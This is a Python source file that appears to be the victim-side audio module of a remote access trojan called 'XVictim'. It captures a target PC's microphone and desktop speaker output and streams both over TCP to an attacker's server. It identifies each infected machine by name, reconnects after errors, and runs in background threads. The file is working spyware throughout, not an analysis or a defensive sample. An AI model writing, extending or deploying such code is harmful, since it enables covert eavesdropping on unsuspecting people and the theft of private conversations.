"""
Audio Streaming Functions for XVictim Victim
Handles speaker-only and mic-only streaming
"""

import socket
import threading
import time
import pyaudio

import config

WIRE_RATE = 44100
WIRE_CHANNELS = 2
WIRE_FORMAT = pyaudio.paInt16
CHUNK = 4096

_speaker_thread = None
_speaker_stop = False
_mic_thread = None
_mic_stop = False


def stream_speaker_audio_via_socket(host: str = None, port: int = 50007, allow_fallback: bool = True) -> dict:
    """Stream speaker/desktop audio only (no microphone)"""
    global _speaker_thread, _speaker_stop
    
    if host is None:
        host = config.SERVER_IP_ADDR
    
    # Check if pyaudiowpatch is available - required for speaker capture
    try:
        import pyaudiowpatch as pyaudio_wp
        has_pyaudiowpatch = True
    except ImportError:
        has_pyaudiowpatch = False
    
    if not has_pyaudiowpatch:
        print(f"[-] pyaudiowpatch NOT available - speaker capture disabled", flush=True)
        print(f"[-] To enable speaker capture, install: pip install pyaudiowpatch", flush=True)
        print(f"[-] Only microphone audio will be available", flush=True)
        return {"status": "error", "message": "pyaudiowpatch required for speaker capture"}
    
    if _speaker_thread is not None and _speaker_thread.is_alive():
        _speaker_stop = True
        _speaker_thread.join(timeout=2.0)
    
    _speaker_stop = False
    
    def _speaker_stream():
        try:
            # Use pyaudiowpatch if available, otherwise fallback to regular pyaudio
            try:
                import pyaudiowpatch as pyaudio_wp
                p = pyaudio_wp.PyAudio()
                has_pyaudiowpatch = True
                print(f"[+] Using pyaudiowpatch for speaker capture", flush=True)
            except ImportError:
                from audio import _GLOBAL_PYAUDIO
                p = _GLOBAL_PYAUDIO
                has_pyaudiowpatch = False
                print(f"[-] Using regular pyaudio - speaker capture limited", flush=True)
            
            from audio import _get_loopback_device
            
            # Get loopback device for speaker audio
            spk_dev = _get_loopback_device(p)
            if not spk_dev:
                return {"status": "error", "message": "No speaker device found"}
            
            print(f"[+] Using device for speaker capture: {spk_dev['name']}", flush=True)
            
            # Open speaker stream - check if pyaudiowpatch is available for as_loopback
            try:
                # Prepare stream parameters
                stream_kwargs = {
                    "format": WIRE_FORMAT,
                    "channels": WIRE_CHANNELS,
                    "rate": WIRE_RATE,
                    "input": True,
                    "input_device_index": spk_dev["index"],
                    "frames_per_buffer": CHUNK
                }
                
                # Add as_loopback only if pyaudiowpatch is available and device supports it
                if has_pyaudiowpatch and spk_dev.get("_as_loopback", False):
                    stream_kwargs["as_loopback"] = True
                    print(f"[+] Using WASAPI loopback mode", flush=True)
                elif spk_dev.get("_fallback", False):
                    print(f"[!] Using fallback device - may only capture microphone audio", flush=True)
                
                spk_stream = p.open(**stream_kwargs)
            except Exception as e:
                print(f"[-] Speaker stream open failed: {e}", flush=True)
                return {"status": "error", "message": str(e)}
            
            print(f"[+] Speaker audio stream started → {host}:{port}", flush=True)
            
            sock = None
            retry_count = 0
            max_retries = 5
            speaker_bytes_sent = 0  # DEBUG: Track bytes sent
            
            while not _speaker_stop:
                try:
                    if sock is None:
                        if retry_count >= max_retries:
                            break
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                        sock.settimeout(5)
                        sock.connect((host, port))
                        sock.settimeout(None)
                        retry_count = 0
                        # Send victim name for authentication
                        sock.sendall((config.PC_NAME + "\n").encode('utf-8'))
                        print(f"[+] Connected to speaker port {host}:{port}", flush=True)
                    
                    # Read and send speaker data
                    data = spk_stream.read(CHUNK, exception_on_overflow=False)
                    if data:
                        sock.sendall(data)
                        speaker_bytes_sent += len(data)  # DEBUG: Count bytes sent
                        # DEBUG: Show data being sent
                        if speaker_bytes_sent % 10000 == 0:  # Every 10KB
                            print(f"[DEBUG] Speaker sent {speaker_bytes_sent:,} bytes total", flush=True)
                    else:
                        # DEBUG: No data read
                        print(f"[DEBUG] Speaker read returned empty data", flush=True)
                        time.sleep(0.1)  # Brief pause when no data
                
                except (socket.error, ConnectionResetError, BrokenPipeError) as e:
                    retry_count += 1
                    print(f"[-] Speaker socket error: {e}; retrying...", flush=True)
                    try:
                        sock.close()
                    except:
                        pass
                    sock = None
                    time.sleep(1)
                except Exception as e:
                    print(f"[-] Speaker stream error: {e}", flush=True)
                    time.sleep(0.1)
            
            if sock:
                try:
                    sock.close()
                except:
                    pass
            if spk_stream:
                spk_stream.stop_stream()
                spk_stream.close()
            
            print(f"[-] Speaker audio streaming stopped - DEBUG: {speaker_bytes_sent:,} bytes sent", flush=True)
            return {"status": "success", "message": "Speaker streaming completed"}
        
        except Exception as e:
            print(f"[-] Speaker stream fatal error: {e}", flush=True)
            return {"status": "error", "message": str(e)}
    
    _speaker_thread = threading.Thread(target=_speaker_stream, daemon=True)
    _speaker_thread.start()
    
    return {"status": "success", "message": "Speaker streaming started"}


def receive_mic_from_socket(host: str = None, port: int = 50010) -> dict:
    """Receive microphone audio from server/client and play it locally"""
    global _mic_thread, _mic_stop
    
    if host is None:
        host = config.SERVER_IP_ADDR
    
    if _mic_thread is not None and _mic_thread.is_alive():
        _mic_stop = True
        _mic_thread.join(timeout=2.0)
    
    _mic_stop = False
    
    def _mic_receive():
        try:
            from audio import _GLOBAL_PYAUDIO, _get_audio_device
            p = _GLOBAL_PYAUDIO
            
            # Get output device for playback
            output_device = _get_audio_device(p, is_input=False)
            if not output_device:
                return {"status": "error", "message": "No output device found"}
            
            # Open output stream for mic playback
            try:
                output_stream = p.open(
                    format=WIRE_FORMAT,
                    channels=WIRE_CHANNELS,
                    rate=WIRE_RATE,
                    output=True,
                    output_device_index=output_device["index"],
                    frames_per_buffer=CHUNK
                )
            except Exception as e:
                print(f"[-] Mic output stream open failed: {e}", flush=True)
                return {"status": "error", "message": str(e)}
            
            print(f"[+] Mic receiver thread starting, listening on {host}:{port}", flush=True)
            
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(5)
                print(f"[+] Waiting for mic data from {host}:{port}...", flush=True)
                sock.connect((host, port))
                print(f"[+] Mic receiver connected to {host}:{port}", flush=True)
                sock.settimeout(None)
                # Send victim name for authentication
                sock.sendall((config.PC_NAME + "\n").encode('utf-8'))
                
                print(f"[+] Starting mic playback...", flush=True)
                while not _mic_stop:
                    try:
                        data = sock.recv(CHUNK * 4)  # Receive audio data
                        if not data:
                            break
                        
                        # Play the received mic audio
                        output_stream.write(data)
                        
                    except Exception as e:
                        if not _mic_stop:
                            print(f"[-] Mic receive/playback error: {e}", flush=True)
                        break
            
            except Exception as e:
                print(f"[-] Mic receiver connection failed: {e}", flush=True)
            finally:
                if output_stream:
                    output_stream.stop_stream()
                    output_stream.close()
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
            
            print("[-] Mic receiver stopped", flush=True)
            return {"status": "success", "message": "Mic receive completed"}
        
        except Exception as e:
            print(f"[-] Mic receive fatal error: {e}", flush=True)
            return {"status": "error", "message": str(e)}
    
    _mic_thread = threading.Thread(target=_mic_receive, daemon=True)
    _mic_thread.start()
    
    return {"status": "success", "message": "Mic receiver started"}


def stream_mic_audio_via_socket(host: str = None, port: int = 50009, allow_fallback: bool = True) -> dict:
    """Stream microphone audio only (no speaker/desktop audio)"""
    global _mic_thread, _mic_stop
    
    if host is None:
        host = config.SERVER_IP_ADDR
    
    if _mic_thread is not None and _mic_thread.is_alive():
        _mic_stop = True
        _mic_thread.join(timeout=2.0)
    
    _mic_stop = False
    
    def _mic_stream():
        try:
            # Use pyaudiowpatch if available for better device support
            try:
                import pyaudiowpatch as pyaudio_wp
                p = pyaudio_wp.PyAudio()
                print(f"[+] Using pyaudiowpatch for mic capture", flush=True)
            except ImportError:
                from audio import _GLOBAL_PYAUDIO
                p = _GLOBAL_PYAUDIO
                print(f"[+] Using regular pyaudio for mic capture", flush=True)
            
            from audio import _get_audio_device
            
            # Get microphone device
            mic_dev = _get_audio_device(p, is_input=True, preferred_name_terms=["microphone", "mikrofon", "mic", "input"], default_fallback=True)
            if not mic_dev:
                return {"status": "error", "message": "No microphone device found"}
            
            # Open microphone stream
            try:
                mic_stream = p.open(
                    format=WIRE_FORMAT,
                    channels=1,  # Mono for mic
                    rate=WIRE_RATE,
                    input=True,
                    input_device_index=mic_dev["index"],
                    frames_per_buffer=CHUNK
                )
            except Exception as e:
                print(f"[-] Mic stream open failed: {e}", flush=True)
                return {"status": "error", "message": str(e)}
            
            print(f"[+] Mic audio stream started → {host}:{port}", flush=True)
            
            sock = None
            retry_count = 0
            max_retries = 5
            mic_bytes_sent = 0  # DEBUG: Track bytes sent
            
            while not _mic_stop:
                try:
                    if sock is None:
                        if retry_count >= max_retries:
                            break
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                        sock.settimeout(5)
                        sock.connect((host, port))
                        sock.settimeout(None)
                        retry_count = 0
                        # Send victim name for authentication
                        sock.sendall((config.PC_NAME + "\n").encode('utf-8'))
                        print(f"[+] Connected to mic port {host}:{port}", flush=True)
                    
                    # Read and send mic data
                    data = mic_stream.read(CHUNK, exception_on_overflow=False)
                    if data:
                        sock.sendall(data)
                        mic_bytes_sent += len(data)  # DEBUG: Count bytes sent
                        # DEBUG: Show data being sent
                        if mic_bytes_sent % 10000 == 0:  # Every 10KB
                            print(f"[DEBUG] Mic sent {mic_bytes_sent:,} bytes total", flush=True)
                    else:
                        # DEBUG: No data read
                        print(f"[DEBUG] Mic read returned empty data", flush=True)
                        time.sleep(0.1)  # Brief pause when no data
                
                except (socket.error, ConnectionResetError, BrokenPipeError) as e:
                    retry_count += 1
                    print(f"[-] Mic socket error: {e}; retrying...", flush=True)
                    try:
                        sock.close()
                    except:
                        pass
                    sock = None
                    time.sleep(1)
                except Exception as e:
                    print(f"[-] Mic stream error: {e}", flush=True)
                    time.sleep(0.1)
            
            if sock:
                try:
                    sock.close()
                except:
                    pass
            if mic_stream:
                mic_stream.stop_stream()
                mic_stream.close()
            
            print(f"[-] Mic audio streaming stopped - DEBUG: {mic_bytes_sent:,} bytes sent", flush=True)
            return {"status": "success", "message": "Mic streaming completed"}
        
        except Exception as e:
            print(f"[-] Mic stream fatal error: {e}", flush=True)
            return {"status": "error", "message": str(e)}
    
    _mic_thread = threading.Thread(target=_mic_stream, daemon=True)
    _mic_thread.start()
    
    return {"status": "success", "message": "Mic streaming started"}


def stop_stream_mic() -> dict:
    """Stop mic streaming"""
    global _mic_stop
    _mic_stop = True
    return {"status": "success", "message": "Mic stream stop requested"}


def stop_stream_speaker() -> dict:
    """Stop speaker streaming"""
    global _speaker_stop
    _speaker_stop = True
    return {"status": "success", "message": "Speaker stream stop requested"}


def stop_receive_mic() -> dict:
    """Stop mic receiving (alias for stop_stream_mic)"""
    return stop_stream_mic()
